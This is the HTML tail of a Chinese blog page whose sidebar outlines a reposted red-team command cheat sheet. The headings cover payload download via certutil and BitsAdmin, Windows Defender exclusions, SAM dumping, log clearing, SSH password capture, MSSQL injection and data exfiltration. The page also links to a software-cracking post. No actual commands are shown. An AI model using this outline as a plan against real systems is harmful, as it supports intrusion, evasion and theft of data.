}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本文转载自洞查文库，作者Explangcn</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>资源分享<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>网络安全<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?_r_=81f1a3c5-8dad-760e-8945-1fc4ba6212fa" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/08/18/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/IDA9.0%20%E7%A0%B4%E8%A7%A3/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://www.dmoe.cc/random.php?_r_=4787c864-fd8f-214b-01ca-507d9821d509" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">IDA9.0 破解</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/08/18/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/IDA9.0%20%E7%A0%B4%E8%A7%A3/" title="IDA9.0 破解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://www.dmoe.cc/random.php?_r_=4787c864-fd8f-214b-01ca-507d9821d509" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-18</div><div class="title">IDA9.0 破解</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/10/18/652ec6e6bfd3a.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">分享自己的生活是一件有趣的事</div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E9%98%9F%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5-%E6%B4%9E%E6%9F%A5%E6%96%87%E5%BA%93"><span class="toc-number">1.</span> <span class="toc-text">红队命令速查-洞查文库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5"><span class="toc-number">1.1.</span> <span class="toc-text">Windows 命令速查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP-%E5%87%BA%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">TCP 出网探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">远程下载文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#certutil"><span class="toc-number">1.3.1.</span> <span class="toc-text">certutil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell"><span class="toc-number">1.3.2.</span> <span class="toc-text">PowerShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BitsAdmin"><span class="toc-number">1.3.3.</span> <span class="toc-text">BitsAdmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rundll32"><span class="toc-number">1.3.4.</span> <span class="toc-text">rundll32</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS-%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.4.</span> <span class="toc-text">IIS 网站查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-IIS-%E7%BB%91%E5%AE%9A%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">查看 IIS 绑定的网站：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-Site-ID-%E4%B8%BA-1-%E7%9A%84%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%EF%BC%9A"><span class="toc-number">1.4.2.</span> <span class="toc-text">查看 Site ID 为 1 的物理路径：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.4.3.</span> <span class="toc-text">IIS 配置文件：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-Windows-%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">查看 Windows 系统版本：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E6%97%B6%E9%97%B4"><span class="toc-number">1.6.</span> <span class="toc-text">修改文件时间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%93%8D%E4%BD%9C"><span class="toc-number">1.7.</span> <span class="toc-text">进程操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%BA%94-PID%EF%BC%9A"><span class="toc-number">1.7.1.</span> <span class="toc-text">查看端口对应 PID：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-PID-%E5%AF%B9%E5%BA%94%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-number">1.7.2.</span> <span class="toc-text">查看 PID 对应程序：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE-PID-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E6%89%80%E5%9C%A8%E7%9B%AE%E5%BD%95%EF%BC%9A"><span class="toc-number">1.7.3.</span> <span class="toc-text">根据 PID 查看程序所在目录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E8%BF%9B%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.7.4.</span> <span class="toc-text">执行进程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E5%90%8D%E7%A7%B0%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.7.5.</span> <span class="toc-text">根据名称结束进程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.7.6.</span> <span class="toc-text">搜索进程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-%E6%97%A0%E7%AA%97%E5%8F%A3%E6%89%A7%E8%A1%8C-EXE"><span class="toc-number">1.8.</span> <span class="toc-text">Powershell 无窗口执行 EXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#net-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.9.</span> <span class="toc-text">net 命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netsh-%E6%93%8D%E4%BD%9C%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.10.</span> <span class="toc-text">netsh 操作防火墙</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">1.10.1.</span> <span class="toc-text">查看防火墙配置：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Server-2003-%E5%8F%8A%E4%B9%8B%E5%89%8D%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8C%E5%85%81%E8%AE%B8%E6%8C%87%E5%AE%9A%E7%A8%8B%E5%BA%8F%E5%85%A8%E9%83%A8%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.10.2.</span> <span class="toc-text">Windows Server 2003 及之前的版本，允许指定程序全部连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Server-2003%E4%B9%8B%E5%90%8E%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">1.10.3.</span> <span class="toc-text">Windows Server 2003之后的版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%81%E8%AE%B83389%E6%94%BE%E8%A1%8C"><span class="toc-number">1.10.4.</span> <span class="toc-text">允许3389放行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIndows-Defender-%E5%8A%A0%E7%99%BD%E6%8E%92%E9%99%A4%E7%9B%AE%E5%BD%95%EF%BC%9A"><span class="toc-number">1.11.</span> <span class="toc-text">WIndows Defender 加白排除目录：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">1.12.</span> <span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%EF%BC%9A"><span class="toc-number">1.13.</span> <span class="toc-text">注册表：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Restricted-Admin-Mode"><span class="toc-number">1.13.1.</span> <span class="toc-text">Restricted Admin Mode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B3389%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.13.2.</span> <span class="toc-text">查看3389端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">1.13.3.</span> <span class="toc-text">开启远程桌面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA-SAM-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.13.4.</span> <span class="toc-text">导出 SAM 数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%98%E7%AC%A6%E5%89%A9%E4%BD%99%E7%A9%BA%E9%97%B4"><span class="toc-number">1.14.</span> <span class="toc-text">查看盘符剩余空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.15.</span> <span class="toc-text">搜索文件：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS-%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.16.</span> <span class="toc-text">CS 上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7"><span class="toc-number">1.17.</span> <span class="toc-text">设置文件属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.18.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP-%E5%87%AD%E6%8D%AE"><span class="toc-number">1.19.</span> <span class="toc-text">RDP 凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E6%89%93%E5%8C%85%E7%9B%AE%E5%BD%95%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.20.</span> <span class="toc-text">Windows 打包目录上传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.21.</span> <span class="toc-text">域渗透命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5"><span class="toc-number">1.22.</span> <span class="toc-text">Linux 命令速查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%AC%A1%E4%B8%8D%E8%AE%B0%E5%BD%95%E5%91%BD%E4%BB%A4"><span class="toc-number">1.23.</span> <span class="toc-text">本次不记录命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%97%A5%E5%BF%97%E6%B8%85%E7%90%86"><span class="toc-number">1.24.</span> <span class="toc-text">常用日志清理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%97%A5%E5%BF%97%E6%B8%85%E7%90%86"><span class="toc-number">1.25.</span> <span class="toc-text">Web 日志清理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E7%BB%88%E7%AB%AF%E4%BB%A3%E7%90%86"><span class="toc-number">1.26.</span> <span class="toc-text">设置终端代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%AE%B0%E5%BD%95"><span class="toc-number">1.27.</span> <span class="toc-text">查看用户登录记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root-%E6%9D%83%E9%99%90%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7"><span class="toc-number">1.28.</span> <span class="toc-text">root 权限创建管理员用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cURL-wget-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">1.29.</span> <span class="toc-text">cURL&#x2F;wget 下载文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl-wget-%E5%8F%91%E9%80%81%E6%96%87%E4%BB%B6"><span class="toc-number">1.30.</span> <span class="toc-text">curl&#x2F;wget 发送文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9"><span class="toc-number">1.31.</span> <span class="toc-text">文件时间修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-DNS-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.32.</span> <span class="toc-text">查看 DNS 服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9C%E6%AD%A2%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.33.</span> <span class="toc-text">停止防火墙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.34.</span> <span class="toc-text">搜索敏感信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#echo-%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.35.</span> <span class="toc-text">echo 写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5-ssh-%E5%85%AC%E9%92%A5%EF%BC%9A"><span class="toc-number">1.36.</span> <span class="toc-text">写入 ssh 公钥：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E6%89%93%E5%8C%85%E6%96%87%E4%BB%B6"><span class="toc-number">1.37.</span> <span class="toc-text">压缩打包文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%89%B2%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.38.</span> <span class="toc-text">分割上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.39.</span> <span class="toc-text">十六进制获取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pam-exec-%E6%8A%93-SSH-%E5%AF%86%E7%A0%81"><span class="toc-number">1.40.</span> <span class="toc-text">pam_exec 抓 SSH 密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Debian-Ubuntu-Docker-%E5%AE%89%E8%A3%85"><span class="toc-number">1.41.</span> <span class="toc-text">Debian&#x2F;Ubuntu Docker 安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDK-%E5%AE%89%E8%A3%85"><span class="toc-number">1.42.</span> <span class="toc-text">JDK 安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5"><span class="toc-number">1.43.</span> <span class="toc-text">数据库命令速查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql"><span class="toc-number">1.44.</span> <span class="toc-text">mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-%E6%9F%A5%E8%BF%9E%E6%8E%A5-IP"><span class="toc-number">1.44.1.</span> <span class="toc-text">mysql 查连接 IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-%E6%9F%A5%E6%9C%80%E5%A4%A7%E6%95%B0%E9%87%8F%E8%A1%A8"><span class="toc-number">1.44.2.</span> <span class="toc-text">mysql 查最大数量表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2-user-%E5%AD%97%E6%AE%B5%E5%9C%A8%E5%93%AA%E4%B8%AA%E5%BA%93%E5%93%AA%E4%B8%AA%E8%A1%A8"><span class="toc-number">1.44.3.</span> <span class="toc-text">查询 user 字段在哪个库哪个表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%9F%E8%AE%A1%E8%AE%BF%E9%97%AE%E8%BF%87%E7%9A%84%E8%A1%A8%E6%AC%A1%E6%95%B0"><span class="toc-number">1.44.4.</span> <span class="toc-text">统计访问过的表次数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%99%E5%85%A5%E6%9D%83%E9%99%90"><span class="toc-number">1.44.5.</span> <span class="toc-text">查看写入权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E7%99%BB%E5%BD%95%E6%89%A7%E8%A1%8C-sql"><span class="toc-number">1.44.6.</span> <span class="toc-text">不登录执行 sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">1.44.7.</span> <span class="toc-text">基础命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-server"><span class="toc-number">1.45.</span> <span class="toc-text">sql server</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell"><span class="toc-number">1.45.1.</span> <span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.45.2.</span> <span class="toc-text">MSSQL 默认数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E6%B3%A8%E9%87%8A"><span class="toc-number">1.45.3.</span> <span class="toc-text">MSSQL 注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E7%94%A8%E6%88%B7"><span class="toc-number">1.45.4.</span> <span class="toc-text">MSSQL 用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E7%89%88%E6%9C%AC%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.45.5.</span> <span class="toc-text">MSSQL 版本查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-number">1.45.6.</span> <span class="toc-text">MSSQL 主机名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.45.7.</span> <span class="toc-text">MSSQL 数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E8%AF%81"><span class="toc-number">1.45.8.</span> <span class="toc-text">MSSQL 数据库凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.45.9.</span> <span class="toc-text">MSSQL 列出数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E5%88%97%E5%87%BA%E5%88%97"><span class="toc-number">1.45.10.</span> <span class="toc-text">MSSQL 列出列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E5%88%97%E5%87%BA%E8%A1%A8"><span class="toc-number">1.45.11.</span> <span class="toc-text">MSSQL 列出表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.45.12.</span> <span class="toc-text">MSSQL 联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.45.13.</span> <span class="toc-text">MSSQL 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.45.14.</span> <span class="toc-text">MSSQL 盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.45.15.</span> <span class="toc-text">MSSQL 时间注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E5%A0%86%E6%A0%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.45.16.</span> <span class="toc-text">MSSQL 堆栈查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.45.17.</span> <span class="toc-text">MSSQL 读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.45.18.</span> <span class="toc-text">MSSQL 命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE"><span class="toc-number">1.45.19.</span> <span class="toc-text">MSSQL 外带数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSSQL-DNS-%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE"><span class="toc-number">1.45.19.1.</span> <span class="toc-text">MSSQL DNS 外带数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSSQL-UNC-%E8%B7%AF%E5%BE%84"><span class="toc-number">1.45.19.2.</span> <span class="toc-text">MSSQL UNC 路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSSQL-%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E4%B8%BA-DB-%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">1.45.19.3.</span> <span class="toc-text">MSSQL 提升权限为 DB 管理员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSSQL-%E5%8F%97%E4%BF%A1%E4%BB%BB%E9%93%BE%E6%8E%A5"><span class="toc-number">1.45.19.4.</span> <span class="toc-text">MSSQL 受信任链接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%9D%83%E9%99%90"><span class="toc-number">1.45.19.5.</span> <span class="toc-text">列出权限</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E6%9C%89%E6%95%88%E6%9D%83%E9%99%90%E3%80%82"><span class="toc-number">1.45.19.5.1.</span> <span class="toc-text">列出当前用户在服务器上的有效权限。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E7%9A%84%E6%9C%89%E6%95%88%E6%9D%83%E9%99%90%E3%80%82"><span class="toc-number">1.45.19.5.2.</span> <span class="toc-text">列出当前用户在数据库上的有效权限。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%9C%A8%E8%A7%86%E5%9B%BE%E4%B8%8A%E7%9A%84%E6%9C%89%E6%95%88%E6%9D%83%E9%99%90%E3%80%82"><span class="toc-number">1.45.19.5.3.</span> <span class="toc-text">列出当前用户在视图上的有效权限。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%98%AF%E5%90%A6%E5%B1%9E%E4%BA%8E%E6%8C%87%E5%AE%9A%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%92%E8%89%B2%E3%80%82"><span class="toc-number">1.45.19.5.4.</span> <span class="toc-text">检查当前用户是否属于指定的服务器角色。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSSQL-OPSEC"><span class="toc-number">1.45.19.6.</span> <span class="toc-text">MSSQL OPSEC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#References"><span class="toc-number">1.45.20.</span> <span class="toc-text">References</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle"><span class="toc-number">1.46.</span> <span class="toc-text">oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle%E6%9F%A5%E6%9C%80%E5%A4%A7%E6%95%B0%E9%87%8F%E8%A1%A8"><span class="toc-number">1.46.1.</span> <span class="toc-text">oracle查最大数量表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%8C%85%E5%90%AB-user-%E5%AD%97%E6%AE%B5%E5%9C%A8%E5%93%AA%E4%B8%AA%E5%BA%93%E5%93%AA%E4%B8%AA%E8%A1%A8"><span class="toc-number">1.46.2.</span> <span class="toc-text">查询包含 user 字段在哪个库哪个表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.46.3.</span> <span class="toc-text">Oracle SQL 默认数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-SQL-%E6%B3%A8%E9%87%8A"><span class="toc-number">1.46.4.</span> <span 